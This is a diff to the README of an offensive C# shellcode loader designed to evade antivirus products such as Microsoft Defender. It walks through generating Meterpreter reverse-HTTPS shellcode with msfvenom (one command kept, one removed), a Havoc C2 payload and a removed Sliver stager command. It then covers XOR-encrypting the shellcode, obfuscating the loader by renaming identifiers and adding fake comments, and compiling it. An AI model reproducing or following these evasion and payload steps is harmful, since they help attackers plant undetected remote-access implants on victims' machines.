@@ -1,7 +1,6 @@
 ### C# ShellCode Loader 1
 --------------------------------------
 Shellcode loader (written in C#) that implements several common defense evasion techniques to bypass antivirus solutions such as Microsoft Defender.
-During my tests, I successfully bypassed several AV solutions but it was detected by the only EDR solution that I tested (memory threat / malicious behavior detected). 
 
 #### FEATURES
   - Classic shellcode injection technique using the function 'NtCreateThreadEx'
@@ -20,15 +19,10 @@ During my tests, I successfully bypassed several AV solutions but it was detecte
 ```
 Examples
 [*]  METASPLOIT C2 Framework 
-    $ msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o staged-raw-shellcode.bin
-    or 
     $ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o stageless-raw-shellcode.bin
 
 [*] HAVOC C2 Framework 
     Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx) 
-
-[*] SLIVER C2 Framework 
-    $ sliver > generate stager --lhost <IP or domain.com>?driver=wininet --format raw --lport 443 --protocol https --arch amd64
 ``` 
 
   - STEP 2. Use the tool 'SUPERNOVA' to convert your raw shellcode in C# format and encrypt it with the XOR algorithm
@@ -42,6 +36,7 @@ Examples
   - STEP 4. Manually obfuscate the C# shellcode loader file
 	- Rename the namespace, the class, the methods, the variables, ...
 	- Delete the comments and add fake ones
+    - Modify the code if needed
 
   - STEP 5. Compile the C# shellcode loader 
 ```  
